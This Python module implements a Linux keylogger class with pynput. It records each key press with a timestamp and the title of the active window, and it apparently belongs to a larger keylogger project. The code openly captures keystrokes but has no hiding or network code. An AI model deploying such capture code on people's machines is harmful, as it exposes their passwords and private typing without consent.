from pynput import keyboard
from typing import List
import time
from interfaces.i_key_logger import IKeyLogger
from factories.window_title_factory import WindowTitleFactory
from utils.window_title_utils import clean_window_title
from models.keystroke import Keystroke

class LinuxKeyLogger(IKeyLogger):
    def __init__(self):
        self.window_title_service = WindowTitleFactory.create_window_title()
        self.logged_keys: List[Keystroke] = []
        self.listener = None
        
    def _initialize_listener(self):
        """Initialize the keyboard listener"""
        if self.listener is None or not self.listener.is_alive():
            self.listener = keyboard.Listener(
                on_press=self.on_press, 
                on_release=self.on_release
            )
            
    def on_press(self, key):
        """callback function that is called when a key is pressed"""
        window_title = self.window_title_service.get_active_window_title()
        clean_window = clean_window_title(window_title)
        
        keystroke = Keystroke(key, time.time(), clean_window)
        # print([keystroke]) 
        self.logged_keys.append(keystroke)
        
    def on_release(self, key):
        """callback function that is called when a key is released"""
        if key == keyboard.Key.esc:
            return False  # stop listener

    def start(self):
        """Start the key logger"""
        self._initialize_listener()
        self.listener.start()
        self.listener.join()

    def stop(self):
        """Stop the key logger"""
        if self.listener and self.listener.is_alive():
            self.listener.stop()

    def get_logged_keys(self) -> List[Keystroke]:
        """Return the collected keystrokes"""
        return self.logged_keys
        
    def clear_logged_keys(self):
        """Clear the collected keystrokes"""
        self.logged_keys.clear()
